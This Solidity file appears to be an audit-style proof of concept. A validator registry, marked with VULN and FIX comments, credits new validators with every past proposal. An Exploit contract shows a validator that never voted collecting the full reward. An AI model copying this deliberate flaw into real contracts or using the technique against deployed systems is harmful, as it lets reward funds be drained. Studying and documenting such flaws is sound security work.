// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
contract Reward { mapping(address=>uint256) public balanceOf; function mint(address to,uint256 a) external { balanceOf[to]+=a; } }
contract ValidatorRegistry {
    mapping(address=>mapping(uint256=>uint256)) internal _baseValidatorScore;
    mapping(address=>mapping(uint256=>uint256)) internal _score;
    mapping(uint256=>uint256) public totalProposals;
    function _getMaxScore(uint256 virtualId) internal view returns(uint256) { return totalProposals[virtualId]; }
    function _initValidatorScore(uint256 virtualId,address validator) internal { _baseValidatorScore[validator][virtualId] = _getMaxScore(virtualId); // @> VULN: new validators inherit every historical proposal as engagement
        // FIX: initialize the base score to zero and account only for actual votes.
    }
    function addProposal(uint256 id) external { totalProposals[id]++; }
    function recordVote(uint256 id,address validator) external { _score[validator][id]++; }
    function addValidator(uint256 id,address validator) external { _initValidatorScore(id,validator); }
    function validatorScore(uint256 virtualId,address validator) public view returns(uint256) { return _baseValidatorScore[validator][virtualId] + _score[validator][virtualId]; }
}
contract Distributor { Reward public reward; ValidatorRegistry public registry; constructor(Reward r,ValidatorRegistry v){reward=r;registry=v;} function pay(uint256 id,address validator) external { reward.mint(validator,(100*registry.validatorScore(id,validator))/registry.totalProposals(id)); } }
contract Exploit {
    Reward public reward; ValidatorRegistry public registry; Distributor public distributor;
    address public constant ACTIVE = address(0xA11CE); address public constant NEW_VALIDATOR = address(0xB0B);
    uint256 public activeScore; uint256 public freeRiderScore;
    constructor(){ reward=new Reward(); registry=new ValidatorRegistry(); distributor=new Distributor(reward,registry); }
    function run() external { registry.addProposal(1); registry.addProposal(1); registry.recordVote(1,ACTIVE); registry.addValidator(1,NEW_VALIDATOR); activeScore=registry.validatorScore(1,ACTIVE); freeRiderScore=registry.validatorScore(1,NEW_VALIDATOR); distributor.pay(1,NEW_VALIDATOR); require(activeScore==1 && freeRiderScore==2,"score mismatch"); require(reward.balanceOf(NEW_VALIDATOR)==100,"full reward without votes"); }
}
